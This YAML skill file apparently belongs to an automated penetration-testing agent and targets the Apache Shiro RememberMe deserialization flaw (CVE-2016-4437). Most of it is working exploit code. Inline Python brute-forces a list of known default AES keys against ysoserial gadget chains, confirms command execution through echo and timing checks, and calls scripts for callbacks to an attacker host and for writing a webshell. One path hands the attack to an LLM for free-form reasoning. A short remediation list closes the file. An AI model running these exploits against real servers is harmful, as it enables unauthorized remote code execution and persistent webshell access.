skill_id: shiro_rce
name: "Apache Shiro RememberMe 反序列化 RCE"
category: java_deserialization
phase: foothold
version: "5.1"

# 漏洞原理详见 SKILL.md

match:
  rules:
    - fingerprint_contains: ["shiro"]
    - fingerprint_contains: ["rememberMe", "deleteMe"]
    - evidence_contains: ["rememberMe=deleteMe"]
    - evidence_contains: ["shiro"]
    - cve_matches: ["CVE-2016-4437"]
    - cve_matches: ["CVE-2020-1957"]

probes:
  - id: confirm_shiro
    description: "确认 Shiro 框架存在"
    command: |
      echo "=== Shiro 探测 ==="
      response=$(curl -s -D - -o /dev/null {ENDPOINT} \
        -H "Cookie: rememberMe=invalid_base64_token_test" \
        --max-time 10 2>&1)
      echo "$response"
      if echo "$response" | grep -qi "rememberMe=deleteMe"; then
        echo "SHIRO_CONFIRMED=true"
      fi
    timeout: 15
    parse_rules:
      - if_contains: ["SHIRO_CONFIRMED=true"]
        set: { shiro_confirmed: true }

  - id: check_java8
    description: "检查 toolbox 中 JDK 8 是否可用"
    depends_on: { shiro_confirmed: true }
    command: |
      FOUND=""
      for p in \
        /usr/lib/jvm/java-8/bin/java \
        /usr/lib/jvm/java-8-openjdk-amd64/bin/java \
        /usr/lib/jvm/temurin-8/bin/java \
      ; do
        if [ -x "$p" ]; then
          ver=$($p -version 2>&1 | head -1)
          echo "JAVA8_PATH:$p"
          echo "JAVA8_VER:$ver"
          FOUND="yes"
          break
        fi
      done
      [ -z "$FOUND" ] && echo "JAVA8_MISSING"
    timeout: 10
    parse_rules:
      - if_regex: "JAVA8_PATH:(.+)"
        set: { java8_available: true }
      - if_contains: ["JAVA8_MISSING"]
        set: { java8_available: false }

  - id: check_lhost
    description: "检查 LHOST 环境变量是否可用于回调"
    depends_on: { shiro_confirmed: true }
    command: |
      if [ -n "$LHOST" ] && [ "$LHOST" != "127.0.0.1" ] && [ "$LHOST" != "0.0.0.0" ] && [ "$LHOST" != "localhost" ]; then
        echo "LHOST_AVAILABLE=$LHOST"
      else
        echo "LHOST_UNAVAILABLE"
      fi
    timeout: 5
    parse_rules:
      - if_contains: ["LHOST_AVAILABLE"]
        set: { lhost_available: true }
      - if_contains: ["LHOST_UNAVAILABLE"]
        set: { lhost_available: false }

exploit_paths:
  # 路径 A: 回调检测爆破
  - path_id: shiro_callback
    name: "shiro_exploit.py 回调检测"
    priority: 1
    conditions:
      shiro_confirmed: true
      lhost_available: true
    steps:
      - id: shiro_exploit
        description: "回调检测爆破（密钥×gadget 自动遍历）"
        publish_ports: [39876]
        command: |
          python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} \
            --lhost "$LHOST" --port 39876
        timeout: 420
        success_criteria:
          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_shiro_callback"

  # 路径 B: 回显检测（su18 EX-TomcatEcho）—— inline Python 绕开脚本su18 bug
  - path_id: shiro_echo
    name: "su18 EX-TomcatEcho 回显检测"
    priority: 3
    conditions:
      shiro_confirmed: true
    steps:
      - id: shiro_echo_direct
        description: "直接调 /opt/ysuserial + pycryptodome AES + curl 回显爆破"
        command: |
          python3 -c '
          import base64,os,subprocess,sys
          from Crypto.Cipher import AES
          t="{ENDPOINT}"
          K=["kPH+bIxk5D2deZiIxcaaaA==","4AvVhmFLUs0KTA3Kprsdag==","3AvVhmFLUs0KTA3Kprsdag==","2AvVhdsgUs0FSA3SDFAdag==","Z3VucwAAAAAAAAAAAAAAAA==","wGiHplamyXlVB11UXWol8g==","fCq+/xW488hMTCD+cmJ3aQ==","0AvVhmFLUs0KTA3Kprsdag==","1QWLxg+NYmxraMoxAXu/Iw==","ZnJhbWUxLjYuMA==","L7RioUULEFhRyxM7a2R/Yg==","r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==","6ZmI6I2j5Y+R5aSn5ZOlAA==","5aaC5qKm5oqA5pyvAAAAAA==","bWicP0XBL7iLRfMSYSSZnQ==","WcfHGU25gNnTxTlmJMeSpw==","ClLk69oNcA3m+s0jIMIkpg==","Is9zJ3pzNh2cgTHB4ua3+Q==","U3ByaW5nQmxhZGUAAAAAAA==","R29vZCBsdWNrISEhISEhISE=","NsZXjXVklWPZwOfkvk6kUA==","GAevYnznvgNCURavBhCr1w==","aU1pcmFjbGVpTWlyYWNsZQ==","ZUdsaGJFshHKlBDbLRvSTw==","SDKOLKn2J1j/2BHjeZwAoQ==","tiVV6g3uZBGfhUGUzwIImQ==","cmVtZW1iZXJNZQAAAAAAAA==","66v1O8keKNV3TTcGPK1wzg==","bXRvbnMAAAAAAAAAAAAAAA==","a2VlcE9uR29pbmdBbmRGaQ==","Bf7MfkNR0axGGpZDB1bABw=="]
          G=["CommonsBeanutils1","CommonsCollections2","CommonsCollections1","CommonsCollections6","CommonsCollections3","CommonsCollections4"]
          ks=[base64.b64decode(k) for k in K if len(base64.b64decode(k))==16]
          for g in G:
            r=subprocess.run(["/opt/ysuserial","-g",g,"-p","EX-TomcatEcho"],capture_output=True,timeout=25)
            if r.returncode!=0 or len(r.stdout)<50: print(f"{g}... SKIP"); continue
            pl=r.stdout; print(f"{g}... OK ({len(pl)} bytes)")
            for dk in ks:
              iv=os.urandom(16); pad=16-(len(pl)%16); pd=pl+bytes([pad]*pad)
              ciph=AES.new(dk,AES.MODE_CBC,iv); cookie=base64.b64encode(iv+ciph.encrypt(pd)).decode()
              r2=subprocess.run(["curl","-s","--max-time","15",t,"-H",f"Cookie: rememberMe={cookie}","-H","X-Token-Data: id"],capture_output=True,text=True,timeout=20)
              if "uid=" in r2.stdout:
                print("SHIRO_RCE_CONFIRMED"); print(f"SHIRO_KEY={base64.b64encode(dk).decode()}"); print(f"SHIRO_GADGET={g}"); print(r2.stdout[:2000]); sys.exit(0)
          print("ALL_FAILED")
          '
        timeout: 600
        success_criteria:
          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_shiro_echo"

  # 路径 C: 写 webshell 验证（NAT 环境无回调）
  - path_id: shiro_webshell
    name: "Shiro 写 webshell 验证 RCE（NAT 环境）"
    priority: 10
    conditions:
      shiro_confirmed: true
    steps:
      - id: shiro_write_shell
        description: "遍历密钥+gadget 写 webshell，HTTP 验证"
        command: "bash {skill_dir}/scripts/shiro_webshell_brute.sh {ENDPOINT} {TARGET_IP} {TARGET_PORT}"
        timeout: 600
        success_criteria:
          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_shiro_webshell"

  # 路径 D: 时序盲检测 —— inline Python 绕开脚本su18 bug
  - path_id: shiro_blind
    name: "su18 TS-N 时序盲检测"
    priority: 5
    conditions:
      shiro_confirmed: true
    steps:
      - id: shiro_blind_direct
        description: "直接调 /opt/ysuserial + pycryptodome AES + 响应时间比对"
        command: |
          python3 -c '
          import base64,os,subprocess,sys,time
          from Crypto.Cipher import AES
          t="{ENDPOINT}"
          K=["kPH+bIxk5D2deZiIxcaaaA==","4AvVhmFLUs0KTA3Kprsdag==","3AvVhmFLUs0KTA3Kprsdag==","2AvVhdsgUs0FSA3SDFAdag==","Z3VucwAAAAAAAAAAAAAAAA==","wGiHplamyXlVB11UXWol8g==","fCq+/xW488hMTCD+cmJ3aQ==","0AvVhmFLUs0KTA3Kprsdag==","1QWLxg+NYmxraMoxAXu/Iw==","ZnJhbWUxLjYuMA==","L7RioUULEFhRyxM7a2R/Yg==","r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==","6ZmI6I2j5Y+R5aSn5ZOlAA==","5aaC5qKm5oqA5pyvAAAAAA==","bWicP0XBL7iLRfMSYSSZnQ==","WcfHGU25gNnTxTlmJMeSpw==","ClLk69oNcA3m+s0jIMIkpg==","Is9zJ3pzNh2cgTHB4ua3+Q==","U3ByaW5nQmxhZGUAAAAAAA==","R29vZCBsdWNrISEhISEhISE=","NsZXjXVklWPZwOfkvk6kUA==","GAevYnznvgNCURavBhCr1w==","aU1pcmFjbGVpTWlyYWNsZQ==","ZUdsaGJFshHKlBDbLRvSTw==","SDKOLKn2J1j/2BHjeZwAoQ==","tiVV6g3uZBGfhUGUzwIImQ==","cmVtZW1iZXJNZQAAAAAAAA==","66v1O8keKNV3TTcGPK1wzg==","bXRvbnMAAAAAAAAAAAAAAA==","a2VlcE9uR29pbmdBbmRGaQ==","Bf7MfkNR0axGGpZDB1bABw=="]
          G=["CommonsBeanutils1","CommonsCollections2","CommonsCollections1","CommonsCollections6","CommonsCollections3","CommonsCollections4"]
          ks=[base64.b64decode(k) for k in K if len(base64.b64decode(k))==16]
          print("[*] 收集基线响应时间（5次正常请求）...")
          bl=[time.time()-time.time()]  # placeholder, overwritten below
          bl_times=[]
          for _ in range(5):
            try:
              t0=time.time(); subprocess.run(["curl","-s","-o","/dev/null",t,"-H","Cookie: rememberMe=baseline_test","--max-time","15"],capture_output=True,timeout=18)
              bl_times.append(time.time()-t0); time.sleep(0.3)
            except: pass
          if not bl_times: print("ALL_FAILED"); sys.exit(1)
          avg=sum(bl_times)/len(bl_times); mx=max(bl_times); th=mx+1.5
          print(f"[*] 基线: avg={avg:.1f}s, max={mx:.1f}s, 阈值={th:.1f}s")
          sleep_sec=5; blind_type=f"TS-{sleep_sec}"
          for g in G:
            r=subprocess.run(["/opt/ysuserial","-g",g,"-p",blind_type],capture_output=True,timeout=25)
            if r.returncode!=0 or len(r.stdout)<50: print(f"{g}... SKIP"); continue
            pl=r.stdout; print(f"{g}... OK ({len(pl)} bytes)")
            for dk in ks:
              iv=os.urandom(16); pad=16-(len(pl)%16); pd=pl+bytes([pad]*pad)
              ciph=AES.new(dk,AES.MODE_CBC,iv); cookie=base64.b64encode(iv+ciph.encrypt(pd)).decode()
              try:
                t0=time.time(); subprocess.run(["curl","-s","-o","/dev/null",t,"-H",f"Cookie: rememberMe={cookie}","--max-time",str(sleep_sec+10)],capture_output=True,timeout=sleep_sec+15)
                elapsed=time.time()-t0
                if elapsed>th:
                  print("SHIRO_RCE_CONFIRMED"); print(f"SHIRO_KEY={base64.b64encode(dk).decode()}"); print(f"SHIRO_GADGET={g}"); print(f"响应时间: {elapsed:.1f}s (基线: {avg:.1f}s)"); sys.exit(0)
              except: pass
          print("ALL_FAILED")
          '
        timeout: 600
        success_criteria:
          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_shiro_blind"

  # 路径 E: LLM 兜底
  - path_id: llm_freeform
    name: "LLM 自由推理（限定 Shiro 漏洞范围）"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      shiro_confirmed: true

remediation: |
  1. 升级 Shiro 至 1.6.0+ 并配置强随机 AES 密钥
  2. 不要使用默认密钥 kPH+bIxk5D2deZiIxcaaaA==
  3. 升级 commons-beanutils、commons-collections 等反序列化依赖
  4. 考虑禁用 rememberMe 功能或缩短有效期
  5. 配置 WAF 拦截超长 Cookie 值
